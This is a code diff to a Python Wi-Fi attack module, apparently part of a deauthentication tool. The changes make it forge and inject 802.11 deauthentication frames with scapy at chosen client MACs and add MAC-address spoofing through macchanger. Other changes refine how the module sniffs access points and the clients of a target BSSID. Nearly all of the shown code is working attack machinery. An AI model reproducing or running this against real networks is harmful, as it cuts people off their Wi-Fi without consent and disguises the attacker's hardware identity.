@@ -2,7 +2,7 @@ import struct
 import subprocess
 import threading
 
-from scapy.layers.dot11 import Dot11, Dot11Elt, sendp
+from scapy.layers.dot11 import Dot11, Dot11Elt, sendp, Dot11Deauth, RadioTap
 
 from .core import Station, AP
 
@@ -17,11 +17,15 @@ class Interface:
         self.aps = []
         self.lock = threading.Lock()
         self.channel_lock = threading.Lock()
-        self.sema = threading.Semaphore(0)
+        self.ap_sema = threading.Semaphore(0)
+        self.sta_sema = threading.Semaphore(0)
         self.essid = essid
+        self.bssid = None
         self._channel = channel
+        self.hop = True
         if channel:
             self.set_channel(channel)
+            self.hop = False
 
     def set_up(self):
         subprocess.run(['/bin/ip', 'link', 'set', self.name, 'up'])
@@ -60,12 +64,17 @@ class Interface:
 
     def set_mac(self, mac):
         self.set_down()
-        subprocess.run(['/bin/ip', 'link', 'set', 'dev', self.name, 'address', mac])
+        subprocess.run(['/bin/ip', 'link', 'set', 'dev', self.name, 'address', mac], stdout=subprocess.DEVNULL)
         self.set_up()
 
     def reset_mac(self):
         self.set_down()
-        subprocess.run(['/usr/bin/macchanger', '-p', self.name])
+        subprocess.run(['/usr/bin/macchanger', '-p', self.name], stdout=subprocess.DEVNULL)
+        self.set_up()
+
+    def spoof_mac(self):
+        self.set_down()
+        subprocess.run(['/usr/bin/macchanger', '-A', self.name], stdout=subprocess.DEVNULL)
         self.set_up()
 
 
@@ -73,16 +82,16 @@ class MonitorInterface(Interface):
     def __init__(self, name, channel=None):
         super().__init__(name, monitor_mode=True, channel=channel)
 
-    def deauth(self, target_mac, count=10, channel=None):
+    def deauth(self, target_mac, bssid, count=10, channel=None):
         self.channel_lock.acquire()
         if channel:
             self.set_channel(channel)
-        subprocess.run(['/usr/sbin/aireplay-ng', '-0', str(count), '-c', target_mac,
-                        '-e', self.essid, self.name])
+        pkt = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
+        self.inject(pkt)
         self.channel_lock.release()
 
     def get_new_client(self):
-        self.sema.acquire()
+        self.sta_sema.acquire()
         target = next((client for client in self.stations if client.new), None)
         target.new = False
         return target
@@ -96,25 +105,25 @@ class MonitorInterface(Interface):
             if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:
                 if pkt.addr3 not in [target.bssid for target in self.aps]:
                     self.lock.acquire()
-                    self.sema.release()
+                    self.ap_sema.release()
                     # http://stackoverflow.com/a/21664038
                     essid, channel, w = None, None, None
                     bssid = pkt.addr3
                     crypto = set()
                     cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
-                      "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
+                                      "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
                     p = pkt[Dot11Elt]
                     while isinstance(p, Dot11Elt):
                         if p.ID == 0:
                             try:
                                 essid = p.info.decode()
-                            except UnicodeDecodeError:
+                            except UnicodeDecodeError as e:
                                 print(p.info)
                                 essid = p.info
                         elif p.ID == 3:
                             try:
                                 channel = ord(p.info)
-                            except TypeError:
+                            except TypeError as e:
                                 print(p.info)
                                 channel = p.info
                         elif p.ID == 48:
@@ -129,23 +138,27 @@ class MonitorInterface(Interface):
                         else:
                             crypto.add("OPN")
                     self.aps.append(AP(bssid, essid, crypto, channel, w))
-                    #print("Adding", bssid, essid, crypto, channel, self.targets[-1].w)
+                    # print("Adding", bssid, essid, crypto, channel, self.targets[-1].w)
                     self.lock.release()
-            elif (pkt.haslayer(Dot11) and pkt.type == 0 and pkt.info
-                  #    and p.info.decode('utf-8') == self.essid
-                  and pkt.subtype in client_mgmt_subtypes):
+            elif (pkt.haslayer(Dot11)
+                  and (pkt.type == 0 and pkt.addr3 == self.bssid
+                       and pkt.subtype in client_mgmt_subtypes
+                       or (pkt.type == 2 and pkt.addr1 == self.bssid))):
                 if pkt.addr2 not in [client.mac_addr for client in self.stations]:
                     self.lock.acquire()
-                    self.sema.release()
-                    # print(p[Dot11Elt:3].info)
-                    self.stations.append(Station(pkt.addr2, pkt[Dot11Elt:3].info, pkt.addr3))
+                    try:
+                        channel = pkt[Dot11Elt:3].info
+                    except IndexError:
+                        channel = self.channel
+                    self.stations.append(Station(pkt.addr2, channel, pkt.addr3))
+                    self.sta_sema.release()
                     self.lock.release()
         except Exception as e:
             print(pkt)
             raise e
 
     def get_new_target(self):
-        self.sema.acquire()
+        self.ap_sema.acquire()
         target = next((ap for ap in self.aps if ap.new), None)
         target.new = False
         return target
